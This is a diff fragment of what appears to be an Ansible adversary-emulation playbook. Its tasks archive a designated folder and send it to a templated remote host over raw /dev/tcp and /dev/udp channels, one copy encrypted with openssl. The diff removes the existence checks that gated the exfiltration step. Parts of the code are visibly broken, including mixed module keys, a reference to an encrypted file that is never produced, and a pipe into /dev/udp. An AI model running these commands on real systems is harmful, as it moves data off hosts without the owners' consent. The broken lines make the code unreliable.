@@ -25,12 +25,10 @@
         path: "{{ exfiltration_folder }}/*"
         dest: "{{ exfiltration_file }}-tcp.gz"
         format: gz
-      when: exfil_check.stat.exists
       shell: |
         tar czpf {{ exfiltration_file }}-tcp.tar.gz {{ exfiltration_folder }}/*
         cat {{ exfiltration_file }}-tcp.tar.gz.enc > /dev/tcp/{{ exfil_fqdn }}/{{ exfil_port }}
         # netcat -lvp > {{ exfiltration_file }}-tcp.tar.gz.enc
-      when: exfil_check.stat.exists
     - name: Exfiltration Over Alternative Protocol UDP
       shell: |
         tar czpf - {{ exfiltration_folder }}/* | openssl aes-256-cbc -salt -k {{ password_encryption }} | /dev/udp/{{ exfil_fqdn }}/{{ exfil_port }} 
